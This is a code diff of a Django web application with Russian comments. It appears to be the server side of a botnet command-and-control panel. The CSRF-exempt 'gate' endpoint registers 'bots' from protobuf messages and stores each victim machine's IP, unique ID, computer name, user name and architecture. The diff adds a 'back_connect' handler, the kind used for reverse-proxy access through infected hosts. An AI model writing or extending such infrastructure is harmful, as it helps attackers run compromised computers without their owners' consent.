@@ -3,11 +3,11 @@ from django.http import JsonResponse
 from django.contrib.auth.models import User
 from django.contrib.auth import login
 from django.views.decorators.csrf import csrf_exempt
-from .bot_pb2 import RegisterBot
+from .bot_pb2 import BotMsg, BackConnectMsg
 from .models import Bot
 import datetime
-from .exceptions import BotNotFound
-#from django.core.paginator import Paginator
+
+# from django.core.paginator import Paginator
 
 
 # ВСПОМОГАТЕЛЬНЫЙ ФУНКЦИИ --------------------------- \/
@@ -120,8 +120,19 @@ class Handlers:
     def __init__(self, subsidiary):
         self.sub = subsidiary
 
+    def back_connect(self, request):
+        try:
+            msg = BackConnectMsg()
+            msg.ParseFromString(request.body)
+            print(msg.uid.decode('utf-16-le'))
+            return 200
+        except Exception as e:
+            print(e)
+            return 404
+
     @staticmethod
-    def login_handler(request) -> HttpResponse:
+    def login_handler(request) -> HttpResponse or JsonResponse:
+        print(request.user)
         username = request.POST['login']
         usr = User.objects.get(username=username)
 
@@ -132,7 +143,14 @@ class Handlers:
 
     @csrf_exempt
     def gate(self, request) -> HttpResponse:
-        bot = RegisterBot()
+
+        msg_type = BotMsg()
+        msg_type.ParseFromString(request.body)
+
+        if msg_type.type == 1:
+            pass
+
+        bot = BotMsg()
         bot.ParseFromString(request.body)
 
         ip = self.sub.get_bot_ip(request)
@@ -147,7 +165,7 @@ class Handlers:
 
         try:
             _bot = Bot.objects.get(uid=uid)
-        except BotNotFound as e:
+        except Exception as e:
             print(e)
             _bot = Bot(ip=ip, uid=uid, computername=computername, username=username, is_x64=is_x64, is_server=is_server)
 
